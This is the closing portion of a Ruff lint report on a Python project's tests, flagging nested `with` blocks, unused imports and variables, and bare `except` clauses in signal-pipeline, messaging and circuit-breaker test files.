358 | |                 "src.app.pipeline.signal_flows.BlackVault",
359 | |                 return_value=mock_dependencies["vault"],
360 | |             ):
    | |______________^
361 |                   with patch(
362 |                       "src.app.pipeline.signal_flows.AuditLog",
    |
help: Combine `with` statements

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_signal_flows_comprehensive.py:397:9
    |
395 |       def test_phase1_validation_success(self, vault_key, mock_dependencies):
396 |           """Test Phase 1: Schema validation succeeds."""
397 | /         with patch(
398 | |             "src.app.pipeline.signal_flows.get_error_aggregator",
399 | |             return_value=mock_dependencies["aggregator"],
400 | |         ):
401 | |             with patch(
402 | |                 "src.app.pipeline.signal_flows.BlackVault",
403 | |                 return_value=mock_dependencies["vault"],
404 | |             ):
    | |______________^
405 |                   with patch(
406 |                       "src.app.pipeline.signal_flows.AuditLog",
    |
help: Combine `with` statements

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_signal_flows_comprehensive.py:450:9
    |
448 |           mock_transcript = Mock(return_value="This is a test transcript")
449 |
450 | /         with patch(
451 | |             "src.app.pipeline.signal_flows.get_error_aggregator",
452 | |             return_value=mock_dependencies["aggregator"],
453 | |         ):
454 | |             with patch(
455 | |                 "src.app.pipeline.signal_flows.BlackVault",
456 | |                 return_value=mock_dependencies["vault"],
457 | |             ):
    | |______________^
458 |                   with patch(
459 |                       "src.app.pipeline.signal_flows.AuditLog",
    |
help: Combine `with` statements

F841 Local variable `result` is assigned to but never used
   --> tests\test_signal_flows_comprehensive.py:483:29
    |
481 |                             }
482 |
483 |                             result = process_signal(signal)
    |                             ^^^^^^
484 |
485 |                             # Verify transcription was attempted
    |
help: Remove assignment to unused variable `result`

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_signal_flows_comprehensive.py:490:9
    |
488 |       def test_phase3_threshold_check_pass(self, vault_key, mock_dependencies):
489 |           """Test Phase 3: Score threshold check passes."""
490 | /         with patch(
491 | |             "src.app.pipeline.signal_flows.get_error_aggregator",
492 | |             return_value=mock_dependencies["aggregator"],
493 | |         ):
494 | |             with patch(
495 | |                 "src.app.pipeline.signal_flows.BlackVault",
496 | |                 return_value=mock_dependencies["vault"],
497 | |             ):
    | |______________^
498 |                   with patch(
499 |                       "src.app.pipeline.signal_flows.AuditLog",
    |
help: Combine `with` statements

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_signal_flows_comprehensive.py:523:9
    |
521 |       def test_phase4_retry_success_on_first_attempt(self, vault_key, mock_dependencies):
522 |           """Test Phase 4: Processing succeeds on first attempt."""
523 | /         with patch(
524 | |             "src.app.pipeline.signal_flows.get_error_aggregator",
525 | |             return_value=mock_dependencies["aggregator"],
526 | |         ):
527 | |             with patch(
528 | |                 "src.app.pipeline.signal_flows.BlackVault",
529 | |                 return_value=mock_dependencies["vault"],
530 | |             ):
    | |______________^
531 |                   with patch(
532 |                       "src.app.pipeline.signal_flows.AuditLog",
    |
help: Combine `with` statements

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_signal_flows_comprehensive.py:556:9
    |
554 |       def test_phase4_retry_success_on_second_attempt(self, vault_key, mock_dependencies):
555 |           """Test Phase 4: Processing succeeds on second attempt after retry."""
556 | /         with patch(
557 | |             "src.app.pipeline.signal_flows.get_error_aggregator",
558 | |             return_value=mock_dependencies["aggregator"],
559 | |         ):
560 | |             with patch(
561 | |                 "src.app.pipeline.signal_flows.BlackVault",
562 | |                 return_value=mock_dependencies["vault"],
563 | |             ):
    | |______________^
564 |                   with patch(
565 |                       "src.app.pipeline.signal_flows.AuditLog",
    |
help: Combine `with` statements

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_signal_flows_comprehensive.py:611:9
    |
609 |               retry_tracker["service_a"]["minute"] = MAX_GLOBAL_RETRIES_PER_MIN
610 |
611 | /         with patch(
612 | |             "src.app.pipeline.signal_flows.get_error_aggregator",
613 | |             return_value=mock_dependencies["aggregator"],
614 | |         ):
615 | |             with patch(
616 | |                 "src.app.pipeline.signal_flows.BlackVault",
617 | |                 return_value=mock_dependencies["vault"],
618 | |             ):
    | |______________^
619 |                   with patch(
620 |                       "src.app.pipeline.signal_flows.AuditLog",
    |
help: Combine `with` statements

F841 Local variable `redacted` is assigned to but never used
   --> tests\test_signal_flows_comprehensive.py:719:9
    |
717 |         text = "Server at 2001:db8::1"
718 |         # Note: Current implementation may not catch compressed IPv6
719 |         redacted = redact_pii(text)
    |         ^^^^^^^^
720 |         # Test passes if either caught or not (edge case documentation)
    |
help: Remove assignment to unused variable `redacted`

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_signal_flows_comprehensive.py:838:9
    |
836 |           assert circuit_breakers["validation"].state == "CLOSED"
837 |
838 | /         with patch(
839 | |             "src.app.pipeline.signal_flows.get_error_aggregator",
840 | |             return_value=mock_dependencies["aggregator"],
841 | |         ):
842 | |             with patch(
843 | |                 "src.app.pipeline.signal_flows.BlackVault",
844 | |                 return_value=mock_dependencies["vault"],
845 | |             ):
    | |______________^
846 |                   with patch(
847 |                       "src.app.pipeline.signal_flows.AuditLog",
    |
help: Combine `with` statements

F401 [*] `src.app.pipeline.signal_flows.circuit_breakers` imported but unused
   --> tests\test_signal_flows_comprehensive.py:871:67
    |
869 |     def test_circuit_breaker_recovery(self, vault_key, mock_dependencies):
870 |         """Test circuit breaker recovery from OPEN to CLOSED."""
871 |         from src.app.pipeline.signal_flows import CircuitBreaker, circuit_breakers
    |                                                                   ^^^^^^^^^^^^^^^^
872 |
873 |         # Create a test circuit breaker with short timeouts
    |
help: Remove unused import: `src.app.pipeline.signal_flows.circuit_breakers`

E722 Do not use bare `except`
   --> tests\test_signal_flows_comprehensive.py:885:13
    |
883 |             try:
884 |                 cb.call(lambda: 1 / 0)
885 |             except:
    |             ^^^^^^
886 |                 pass
    |

E722 Do not use bare `except`
   --> tests\test_signal_flows_comprehensive.py:911:13
    |
909 |             try:
910 |                 cb.call(lambda: 1 / 0)
911 |             except:
    |             ^^^^^^
912 |                 pass
    |

E722 Do not use bare `except`
   --> tests\test_signal_flows_comprehensive.py:924:9
    |
922 |         try:
923 |             cb.call(lambda: 1 / 0)
924 |         except:
    |         ^^^^^^
925 |             pass
    |

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_signal_flows_comprehensive.py:940:9
    |
938 |       def test_signal_with_none_text(self, vault_key, mock_dependencies):
939 |           """Test signal processing with None text."""
940 | /         with patch(
941 | |             "src.app.pipeline.signal_flows.get_error_aggregator",
942 | |             return_value=mock_dependencies["aggregator"],
943 | |         ):
944 | |             with patch(
945 | |                 "src.app.pipeline.signal_flows.BlackVault",
946 | |                 return_value=mock_dependencies["vault"],
947 | |             ):
    | |______________^
948 |                   with patch(
949 |                       "src.app.pipeline.signal_flows.AuditLog",
    |
help: Combine `with` statements

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_signal_flows_comprehensive.py:971:9
    |
969 |       def test_exponential_backoff_delays(self, vault_key, mock_dependencies):
970 |           """Test exponential backoff delay calculation."""
971 | /         with patch(
972 | |             "src.app.pipeline.signal_flows.get_error_aggregator",
973 | |             return_value=mock_dependencies["aggregator"],
974 | |         ):
975 | |             with patch(
976 | |                 "src.app.pipeline.signal_flows.BlackVault",
977 | |                 return_value=mock_dependencies["vault"],
978 | |             ):
    | |______________^
979 |                   with patch(
980 |                       "src.app.pipeline.signal_flows.AuditLog",
    |
help: Combine `with` statements

F401 [*] `src.app.pipeline.signal_flows.RETRY_BACKOFF_BASE` imported but unused
   --> tests\test_signal_flows_comprehensive.py:988:29
    |
986 |                     ):
987 |                         from src.app.pipeline.signal_flows import (
988 |                             RETRY_BACKOFF_BASE,
    |                             ^^^^^^^^^^^^^^^^^^
989 |                             RETRY_MAX_DELAY,
990 |                             process_signal,
    |
help: Remove unused import

F401 [*] `src.app.pipeline.signal_flows.RETRY_MAX_DELAY` imported but unused
   --> tests\test_signal_flows_comprehensive.py:989:29
    |
987 |                         from src.app.pipeline.signal_flows import (
988 |                             RETRY_BACKOFF_BASE,
989 |                             RETRY_MAX_DELAY,
    |                             ^^^^^^^^^^^^^^^
990 |                             process_signal,
991 |                         )
    |
help: Remove unused import

F841 Local variable `result` is assigned to but never used
    --> tests\test_signal_flows_comprehensive.py:1004:29
     |
1002 |                         # Mock time.sleep to verify delays
1003 |                         with patch("time.sleep") as mock_sleep:
1004 |                             result = process_signal(signal)
     |                             ^^^^^^
1005 |
1006 |                             # Should have called sleep with exponential delays
     |
help: Remove assignment to unused variable `result`

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
    --> tests\test_signal_flows_comprehensive.py:1023:9
     |
1021 |       def test_batch_all_successful(self, vault_key, mock_dependencies):
1022 |           """Test batch processing with all signals successful."""
1023 | /         with patch(
1024 | |             "src.app.pipeline.signal_flows.get_error_aggregator",
1025 | |             return_value=mock_dependencies["aggregator"],
1026 | |         ):
1027 | |             with patch(
1028 | |                 "src.app.pipeline.signal_flows.BlackVault",
1029 | |                 return_value=mock_dependencies["vault"],
1030 | |             ):
     | |______________^
1031 |                   with patch(
1032 |                       "src.app.pipeline.signal_flows.AuditLog",
     |
help: Combine `with` statements

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
    --> tests\test_signal_flows_comprehensive.py:1059:9
     |
1057 |       def test_batch_mixed_statuses(self, vault_key, mock_dependencies):
1058 |           """Test batch with mixed status results."""
1059 | /         with patch(
1060 | |             "src.app.pipeline.signal_flows.get_error_aggregator",
1061 | |             return_value=mock_dependencies["aggregator"],
1062 | |         ):
1063 | |             with patch(
1064 | |                 "src.app.pipeline.signal_flows.BlackVault",
1065 | |                 return_value=mock_dependencies["vault"],
1066 | |             ):
     | |______________^
1067 |                   with patch(
1068 |                       "src.app.pipeline.signal_flows.AuditLog",
     |
help: Combine `with` statements

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
    --> tests\test_signal_flows_comprehensive.py:1109:9
     |
1107 |       def test_batch_empty(self, vault_key, mock_dependencies):
1108 |           """Test batch processing with empty list."""
1109 | /         with patch(
1110 | |             "src.app.pipeline.signal_flows.get_error_aggregator",
1111 | |             return_value=mock_dependencies["aggregator"],
1112 | |         ):
1113 | |             with patch(
1114 | |                 "src.app.pipeline.signal_flows.BlackVault",
1115 | |                 return_value=mock_dependencies["vault"],
1116 | |             ):
     | |______________^
1117 |                   with patch(
1118 |                       "src.app.pipeline.signal_flows.AuditLog",
     |
help: Combine `with` statements

B007 Loop control variable `i` not used within loop body
    --> tests\test_signal_flows_comprehensive.py:1272:13
     |
1270 |         # Trigger 5 failures to OPEN the circuit
1271 |         mock_time.return_value = 1000.0
1272 |         for i in range(5):
     |             ^
1273 |             try:
1274 |                 cb.call(lambda: 1 / 0)  # Trigger failure
     |
help: Rename unused `i` to `_i`

E722 Do not use bare `except`
    --> tests\test_signal_flows_comprehensive.py:1275:13
     |
1273 |             try:
1274 |                 cb.call(lambda: 1 / 0)  # Trigger failure
1275 |             except:
     |             ^^^^^^
1276 |                 pass
     |

E722 Do not use bare `except`
    --> tests\test_signal_flows_comprehensive.py:1319:13
     |
1317 |             try:
1318 |                 cb.call(lambda: 1 / 0)
1319 |             except:
     |             ^^^^^^
1320 |                 pass
     |

E722 Do not use bare `except`
    --> tests\test_signal_flows_comprehensive.py:1334:9
     |
1332 |         try:
1333 |             cb.call(lambda: 1 / 0)
1334 |         except:
     |         ^^^^^^
1335 |             pass
     |

E722 Do not use bare `except`
    --> tests\test_signal_flows_comprehensive.py:1356:13
     |
1354 |             try:
1355 |                 cb.call(lambda: 1 / 0)
1356 |             except:
     |             ^^^^^^
1357 |                 pass
     |

B017 Do not assert blind exception: `Exception`
    --> tests\test_signal_flows_comprehensive.py:1363:14
     |
1361 |         # Fast-forward to T+30s - should still be OPEN (timeout=60s)
1362 |         mock_time.return_value = 1030.0
1363 |         with pytest.raises(Exception):
     |              ^^^^^^^^^^^^^^^^^^^^^^^^
1364 |             cb.call(lambda: "success")
     |

F841 Local variable `result` is assigned to but never used
    --> tests\test_signal_flows_comprehensive.py:1372:9
     |
1371 |         # Success should close it
1372 |         result = cb.call(lambda: "success")
     |         ^^^^^^
1373 |         assert cb.state == "CLOSED"
     |
help: Remove assignment to unused variable `result`

E722 Do not use bare `except`
    --> tests\test_signal_flows_comprehensive.py:1389:13
     |
1387 |             try:
1388 |                 cb.call(lambda: 1 / 0)
1389 |             except:
     |             ^^^^^^
1390 |                 pass
     |

F841 Local variable `result` is assigned to but never used
    --> tests\test_signal_flows_comprehensive.py:1396:9
     |
1394 |         # Fast-forward to T+45s - should enter HALF_OPEN
1395 |         mock_time.return_value = 1045.0
1396 |         result = cb.call(lambda: "success")
     |         ^^^^^^
1397 |         assert cb.state == "HALF_OPEN"
     |
help: Remove assignment to unused variable `result`

E722 Do not use bare `except`
    --> tests\test_signal_flows_comprehensive.py:1424:13
     |
1422 |             try:
1423 |                 validation_cb.call(lambda: 1 / 0)
1424 |             except:
     |             ^^^^^^
1425 |                 pass
     |

E722 Do not use bare `except`
    --> tests\test_signal_flows_comprehensive.py:1438:13
     |
1436 |             try:
1437 |                 transcription_cb.call(lambda: 1 / 0)
1438 |             except:
     |             ^^^^^^
1439 |                 pass
     |

F401 [*] `security.black_vault.BlackVault` imported but unused
    --> tests\test_signal_flows_comprehensive.py:1511:42
     |
1509 |         Validates complete error flow: exception ΓåÆ aggregator ΓåÆ vault.
1510 |         """
1511 |         from security.black_vault import BlackVault
     |                                          ^^^^^^^^^^
1512 |         from src.app.core.error_aggregator import GlobalErrorAggregator
1513 |         from src.app.pipeline.signal_flows import process_signal
     |
help: Remove unused import: `security.black_vault.BlackVault`

F401 [*] `src.app.core.error_aggregator.GlobalErrorAggregator` imported but unused
    --> tests\test_signal_flows_comprehensive.py:1512:51
     |
1510 |         """
1511 |         from security.black_vault import BlackVault
1512 |         from src.app.core.error_aggregator import GlobalErrorAggregator
     |                                                   ^^^^^^^^^^^^^^^^^^^^^
1513 |         from src.app.pipeline.signal_flows import process_signal
     |
help: Remove unused import: `src.app.core.error_aggregator.GlobalErrorAggregator`

SIM117 Use a single `with` statement with multiple contexts instead of nested `with` statements
  --> tests\test_sovereign_messaging.py:50:9
   |
48 |       def test_code_uniqueness(self):
49 |           """Test that different instances get unique codes."""
50 | /         with tempfile.TemporaryDirectory() as tmpdir1:
51 | |             with tempfile.TemporaryDirectory() as tmpdir2:
   | |__________________________________________________________^
52 |                   messaging1 = SovereignMessaging(
53 |                       data_dir=tmpdir1, participant_name="user1"
   |
help: Combine `with` statements

SIM117 Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_sovereign_messaging.py:157:9
    |
155 |       def test_hybrid_encryption_workflow(self):
156 |           """Test complete hybrid encryption workflow."""
157 | /         with tempfile.TemporaryDirectory() as tmpdir1:
158 | |             with tempfile.TemporaryDirectory() as tmpdir2:
    | |__________________________________________________________^
159 |                   # Create two participants
160 |                   sender = SovereignMessaging(data_dir=tmpdir1, participant_name="Alice")
    |
help: Combine `with` statements

SIM117 Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_sovereign_messaging.py:201:9
    |
199 |       def test_pair_with_valid_contact(self):
200 |           """Test pairing with valid contact."""
201 | /         with tempfile.TemporaryDirectory() as tmpdir1:
202 | |             with tempfile.TemporaryDirectory() as tmpdir2:
    | |__________________________________________________________^
203 |                   user1 = SovereignMessaging(data_dir=tmpdir1, participant_name="User1")
204 |                   user2 = SovereignMessaging(data_dir=tmpdir2, participant_name="User2")
    |
help: Combine `with` statements

SIM117 Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_sovereign_messaging.py:226:9
    |
224 |       def test_pair_user_and_ai(self):
225 |           """Test pairing between user and AI."""
226 | /         with tempfile.TemporaryDirectory() as tmpdir1:
227 | |             with tempfile.TemporaryDirectory() as tmpdir2:
    | |__________________________________________________________^
228 |                   user = SovereignMessaging(data_dir=tmpdir1, participant_name="User")
229 |                   ai = SovereignMessaging(
    |
help: Combine `with` statements

SIM117 Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_sovereign_messaging.py:267:9
    |
265 |       def test_send_message_success(self):
266 |           """Test successful message sending."""
267 | /         with tempfile.TemporaryDirectory() as tmpdir1:
268 | |             with tempfile.TemporaryDirectory() as tmpdir2:
    | |__________________________________________________________^
269 |                   sender = SovereignMessaging(data_dir=tmpdir1, participant_name="Sender")
270 |                   receiver = SovereignMessaging(
    |
help: Combine `with` statements

SIM117 Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_sovereign_messaging.py:300:9
    |
298 |       def test_receive_message_success(self):
299 |           """Test successful message receiving and decryption."""
300 | /         with tempfile.TemporaryDirectory() as tmpdir1:
301 | |             with tempfile.TemporaryDirectory() as tmpdir2:
    | |__________________________________________________________^
302 |                   sender = SovereignMessaging(data_dir=tmpdir1, participant_name="Sender")
303 |                   receiver = SovereignMessaging(
    |
help: Combine `with` statements

SIM117 Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_sovereign_messaging.py:353:9
    |
351 |       def test_message_status_progression(self):
352 |           """Test message status: SENT ΓåÆ DELIVERED ΓåÆ SEEN."""
353 | /         with tempfile.TemporaryDirectory() as tmpdir1:
354 | |             with tempfile.TemporaryDirectory() as tmpdir2:
    | |__________________________________________________________^
355 |                   sender = SovereignMessaging(data_dir=tmpdir1, participant_name="Sender")
356 |                   receiver = SovereignMessaging(
    |
help: Combine `with` statements

SIM117 Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_sovereign_messaging.py:517:9
    |
515 |       def test_messages_persistence(self):
516 |           """Test messages are saved and loaded correctly."""
517 | /         with tempfile.TemporaryDirectory() as tmpdir1:
518 | |             with tempfile.TemporaryDirectory() as tmpdir2:
    | |__________________________________________________________^
519 |                   sender = SovereignMessaging(data_dir=tmpdir1, participant_name="Sender")
520 |                   receiver = SovereignMessaging(
    |
help: Combine `with` statements

SIM117 Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> tests\test_sovereign_messaging.py:601:9
    |
599 |       def test_user_ai_conversation(self):
600 |           """Test conversation between user and AI."""
601 | /         with tempfile.TemporaryDirectory() as tmpdir1:
602 | |             with tempfile.TemporaryDirectory() as tmpdir2:
    | |__________________________________________________________^
603 |                   user = SovereignMessaging(data_dir=tmpdir1, participant_name="Human")
604 |                   ai = SovereignMessaging(data_dir=tmpdir2, participant_name="AI_Agent")
    |
help: Combine `with` statements

F401 [*] `pytest` imported but unused
 --> tests\test_substrate.py:5:8
  |
3 | """
4 |
5 | import pytest
  |        ^^^^^^
6 |
7 | from cerberus.sase.core.substrate import (
  |
help: Remove unused import: `pytest`

B007 Loop control variable `task_id` not used within loop body
   --> tests\test_tarl_load_chaos_soak.py:332:17
    |
331 |             # Simulate processing
332 |             for task_id in task_ids:
    |                 ^^^^^^^
333 |                 try:
334 |                     task = stack.task_queue.lease_task(
    |
help: Rename unused `task_id` to `_task_id`

B007 Loop control variable `task_id` not used within loop body
   --> tests\test_tarl_load_chaos_soak.py:456:17
    |
455 |             # Complete tasks
456 |             for task_id in task_ids:
    |                 ^^^^^^^
457 |                 try:
458 |                     task = stack.task_queue.lease_task(
    |
help: Rename unused `task_id` to `_task_id`

F401 `app.governance.tsa_provider.TSAToken` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> tests\test_tsa_integration.py:38:58
   |
36 |         TSAAnchorManager,
37 |     )
38 |     from app.governance.tsa_provider import TSAProvider, TSAToken, TSAVerificationError
   |                                                          ^^^^^^^^
39 | except ImportError:
40 |     from src.app.governance.sovereign_audit_log import SovereignAuditLog
   |
help: Remove unused import: `app.governance.tsa_provider.TSAToken`

N801 Class name `TestTSECA_Ghost_System` should use CapWords convention
   --> tests\test_tseca_ghost_protocol.py:408:7
    |
408 | class TestTSECA_Ghost_System:
    |       ^^^^^^^^^^^^^^^^^^^^^^
409 |     """Test unified TSECA/GHOST system."""
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> utils\encryption\god_tier_encryption.py:163:13
    |
161 |         except Exception as e:
162 |             self.logger.error("GOD TIER decryption failed: %s", e)
163 |             raise ValueError("Decryption failed - data may be corrupted or tampered")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
164 |
165 |     def _encrypt_aes_gcm(self, data: bytes) -> bytes:
    |

Found 10145 errors.
[*] 4150 fixable with the `--fix` option (1332 hidden fixes can be enabled with the `--unsafe-fixes` option).
